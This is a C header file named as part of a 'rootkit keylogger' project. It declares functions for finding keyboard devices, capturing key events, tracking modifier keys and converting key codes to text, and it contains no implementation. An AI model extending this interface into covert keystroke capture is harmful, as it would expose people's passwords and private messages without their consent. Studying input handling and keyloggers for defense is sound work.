#ifndef ROOTKIT_KEYLOGGER_H
#define ROOTKIT_KEYLOGGER_H

#include <stddef.h>
#include <stdint.h>
#include <stdlib.h>

#define BITS_PER_LONG (sizeof(long) * 8)
#define NBITS(x) ((((x)-1)/BITS_PER_LONG)+1)
#define OFF(x)  ((x)%BITS_PER_LONG)
#define BIT(x)  (1UL<<OFF(x))
#define LONG(x) ((x)/BITS_PER_LONG)
#define test_bit(bit, array) ((array[LONG(bit)] >> OFF(bit)) & 1)
#define PATH_MAX_LEN 512
// USB HID usage codes for Parallels workaround
#define HID_USAGE_KEYBOARD_LEFTSHIFT  ((uint32_t)0x700e1)
#define HID_USAGE_KEYBOARD_RIGHTSHIFT ((uint32_t)0x700e5)

// Modifier key state tracking
typedef struct {
    int shift;
    int ctrl;
    int alt;
    int meta;
    int capslock;
} modifier_state_t;

void capture_keys(const char *device_path);
const char* event_type_to_string(int type);
const char* code_to_string(int type, int code);
const char* code_to_string_buf(int type, int code, char *buf, size_t buflen);
const char* value_to_string(int type, int code, int value);
void update_modifiers(int code, int value);
void print_modifiers(void);
int fix_parallels_key_code(int code, uint32_t scan_code, int *was_fixed);
int verify_device(int fd);
// void print_device_info(int fd);
void print_relative_time(struct timeval *ev_time);


void discover_keyboards(void);
int is_keyboard(int fd);
void print_device_info(const char *path, int fd);

#endif //ROOTKIT_KEYLOGGER_H